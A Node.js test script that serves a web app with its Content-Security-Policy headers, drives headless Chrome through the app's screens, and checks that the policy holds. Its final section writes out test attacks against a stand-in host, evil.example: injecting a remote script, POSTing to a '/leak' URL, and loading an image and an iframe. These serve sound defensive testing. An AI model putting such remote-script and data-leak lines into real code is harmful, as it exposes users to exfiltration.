import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { readFileSync, mkdtempSync, existsSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";
import { join, extname } from "node:path";

// Run from the repo root:  node tests/browser/headers.mjs   (needs Node 22+ and Chrome; no Python)
// Serves the folder with exactly the headers in vercel.json, boots the app, walks the main screens and fails on
// any Content-Security-Policy violation or uncaught error. Also proves the policy is live by trying to break it.
// The supabase-js CDN script is blocked and replaced with fake-supabase.js, so no real account is touched.
const REPO = fileURLToPath(new URL("../..", import.meta.url));
const CHROME = process.env.CHROME || "C:/Program Files/Google/Chrome/Application/chrome.exe";
const NO_SANDBOX = process.env.CI || process.env.NO_SANDBOX ? ["--no-sandbox"] : [];
const FAKE = readFileSync(new URL("./fake-supabase.js", import.meta.url), "utf8");
const CONFIG = JSON.parse(readFileSync(join(REPO, "vercel.json"), "utf8"));
const HEADERS = Object.fromEntries(CONFIG.headers.find(h => h.source === "/(.*)").headers.map(h => [h.key, h.value]));
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".json": "application/json", ".woff2": "font/woff2", ".woff": "font/woff", ".ttf": "font/ttf", ".txt": "text/plain", ".svg": "image/svg+xml" };
const sleep = ms => new Promise(r => setTimeout(r, ms));
let pass = 0, fail = 0;
const ok = (name, cond, extra = "") => { cond ? pass++ : fail++; console.log(`${cond ? "PASS" : "FAIL"}  ${name}${cond ? "" : "  " + extra}`); };

console.log("--- 1. vercel.json");
const csp = HEADERS["Content-Security-Policy"] || "";
ok("every expected header is configured", ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy", "Permissions-Policy"].every(k => HEADERS[k]), Object.keys(HEADERS).join(","));
ok("framing is refused twice (CSP and X-Frame-Options)", /frame-ancestors 'none'/.test(csp) && HEADERS["X-Frame-Options"] === "DENY");
ok("no plugins, base tag or form posts to other sites", /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp) && /form-action 'self'/.test(csp));
ok("scripts only from this site and jsDelivr", /script-src 'self' 'unsafe-inline' https:\/\/cdn\.jsdelivr\.net;/.test(csp));
ok("frames only from the Lemon Squeezy store (the in-app checkout), nothing else", /frame-src https:\/\/wholelife\.lemonsqueezy\.com;/.test(csp) && (csp.match(/frame-src [^;]*/) || [""])[0].split(" ").length === 2);
ok("the payment feature only for that same store, not this page or any other site", /payment=\("https:\/\/wholelife\.lemonsqueezy\.com"\)/.test(HEADERS["Permissions-Policy"] || ""));
const ckHosts = [...readFileSync(join(REPO, "index.html"), "utf8").matchAll(/https:\/\/([a-z0-9-]+\.lemonsqueezy\.com)\/checkout\//g)].map(m => m[1]);
ok("every checkout link in the app is on the host the frame policy allows", ckHosts.length > 0 && ckHosts.every(h => h === "wholelife.lemonsqueezy.com"), ckHosts.join(","));
ok("network only to this site and the Supabase project", /connect-src 'self' https:\/\/[a-z0-9]+\.supabase\.co;/.test(csp));
const html = readFileSync(join(REPO, "index.html"), "utf8");
ok("the Supabase URL in the policy matches the app's SB_URL", html.includes(`SB_URL = "${(csp.match(/connect-src 'self' (https:\/\/[a-z0-9]+\.supabase\.co)/) || [])[1]}"`));

const server = createServer((req, res) => {
  const path = decodeURIComponent(new URL(req.url, "http://x").pathname);
  const file = join(REPO, path === "/" ? "index.html" : path);
  if (!file.startsWith(REPO) || !existsSync(file) || /(^|[\\/])\./.test(path)) { res.writeHead(404); res.end("not found"); return; }
  res.writeHead(200, { "content-type": TYPES[extname(file)] || "application/octet-stream", ...HEADERS });
  res.end(readFileSync(file));
}).listen(8770, "127.0.0.1");
const procs = [{ kill: () => server.close() }];
const chrome = spawn(CHROME, ["--headless=new", "--remote-debugging-port=9338", `--user-data-dir=${mkdtempSync(join(tmpdir(), "wlh-hdr-"))}`, "--no-first-run", "--disable-gpu", ...NO_SANDBOX, "about:blank"], { stdio: "ignore" }); procs.push(chrome);
// Wait for Chrome's debugging port instead of a fixed sleep: a cold start on a CI runner can take several seconds.
let list = null;
for (let i = 0; i < 80 && !list; i++) { try { const l = await (await fetch("http://127.0.0.1:9338/json/list")).json(); if (l.some(t => t.type === "page")) list = l; } catch {} if (!list) await sleep(250); }
if (!list) { console.log("FAIL  Chrome did not start (set CHROME to its path)"); procs.forEach(p => { try { p.kill(); } catch {} }); process.exit(1); }
// Never leave Chrome or the server running if the test throws: a leftover Chrome on the same port would poison the next test.
process.on("exit", () => procs.forEach(p => { try { p.kill(); } catch {} }));
const ws = new WebSocket(list.find(t => t.type === "page").webSocketDebuggerUrl);
await new Promise(r => ws.onopen = r);
let id = 0; const pending = new Map(); const errors = [];
ws.onmessage = m => { const d = JSON.parse(m.data); if (d.id && pending.has(d.id)) { pending.get(d.id)(d); pending.delete(d.id); } else if (d.method === "Runtime.exceptionThrown") errors.push(d.params.exceptionDetails.exception?.description || d.params.exceptionDetails.text); };
const send = (method, params = {}) => new Promise(r => { const i = ++id; pending.set(i, r); ws.send(JSON.stringify({ id: i, method, params })); });
const ev = async expr => { const r = await send("Runtime.evaluate", { expression: expr, awaitPromise: true, returnByValue: true }); if (r.result.exceptionDetails) throw new Error(r.result.exceptionDetails.exception?.description || r.result.exceptionDetails.text); return r.result.result.value; };
const waitFor = async (expr, ms = 8000) => { const t = Date.now(); while (Date.now() - t < ms) { try { if (await ev(expr)) return true; } catch {} await sleep(150); } return false; };

await send("Runtime.enable"); await send("Page.enable"); await send("Network.enable");
await send("Network.setBlockedURLs", { urls: ["*jsdelivr.net*"] });
// Record every policy violation the page reports. Injected before any page script runs.
await send("Page.addScriptToEvaluateOnNewDocument", { source: `window.__csp = []; document.addEventListener("securitypolicyviolation", e => window.__csp.push(e.violatedDirective + " " + e.blockedURI.slice(0, 80)));` });
await send("Page.addScriptToEvaluateOnNewDocument", { source: FAKE });
const READY = "typeof S !== 'undefined' && typeof SB !== 'undefined' && SB.booted === true && UI.loading === false";

console.log("--- 2. the server sends the headers");
const r = await fetch("http://127.0.0.1:8770/index.html");
ok("every configured header is on the response", Object.entries(HEADERS).every(([k, v]) => r.headers.get(k) === v));

console.log("--- 3. the app runs under the policy");
await send("Page.navigate", { url: "http://127.0.0.1:8770/index.html" }); await sleep(500);
ok("app boots", await waitFor(READY, 15000), errors.join(" | "));
await ev(`(async()=>{ const p=newProfile("Ada"); p.onboarded=true; p.coachPrompted=true; p.tourSeen="dismissed"; S.profiles=[p]; S.activeId=p.id; saveProfile(); await flush(); return true; })()`);
await ev(`(async()=>{ addEntry("meals",{id:uid(),date:today(),slot:"lunch",name:"Jollof rice",cal:500,dish:null,extras:[],est:false,photo:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="}); render(); return true; })()`);
// Every top-level screen in the app's own menu (NAV in index.html), so a new screen that needs a blocked source shows up here.
const routes = await ev(`NAV.flatMap(g => g[1]).map(n => n[0]).filter(r => !["cat", "metric", "alcohol"].includes(r))`);
ok("found the app's screens", routes.length >= 15, String(routes.length));
const wrong = [];
for (const r of routes) {
  await ev(`location.hash = ${JSON.stringify("#/" + r)}; true`); await sleep(350);
  if ((await ev(`UI.route`)) !== r) wrong.push(r);
}
ok("every screen opened", wrong.length === 0, wrong.join(","));
await ev(`document.querySelector('[data-act="sb-open"]')?.click(); true`); await sleep(300);
const real = await ev(`window.__csp.slice()`);
ok("no policy violations while using the app", real.length === 0, real.join(" | "));
ok("no uncaught exceptions", errors.length === 0, errors.join(" | ").slice(0, 400));
ok("fonts loaded from this site", await ev(`document.fonts.size > 0 && [...document.fonts].some(f => f.status === "loaded")`));

console.log("--- 4. the policy really blocks things");
await ev(`window.__csp.length = 0; true`);
await ev(`(() => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.head.appendChild(s); return true; })()`); await sleep(400);
await ev(`fetch("https://evil.example/leak", { method: "POST", body: "x", mode: "no-cors" }).catch(() => {}); true`); await sleep(400);
await ev(`(() => { const i = new Image(); i.src = "https://evil.example/pixel.gif"; return true; })()`); await sleep(400);
await ev(`(() => { const f = document.createElement("iframe"); f.src = "https://evil.example/"; document.body.appendChild(f); return true; })()`); await sleep(400);
const blocked = (await ev(`window.__csp.slice()`)).join(" | ");
ok("a script from another site is blocked", /script-src/.test(blocked), blocked);
ok("a request to another site is blocked", /connect-src/.test(blocked), blocked);
ok("an image from another site is blocked", /img-src/.test(blocked), blocked);
ok("an iframe to another site is blocked", /frame-src|default-src/.test(blocked), blocked);

console.log(`\n${pass} passed, ${fail} failed`);
ws.close(); procs.forEach(p => { try { p.kill(); } catch {} }); process.exit(fail ? 1 : 0);
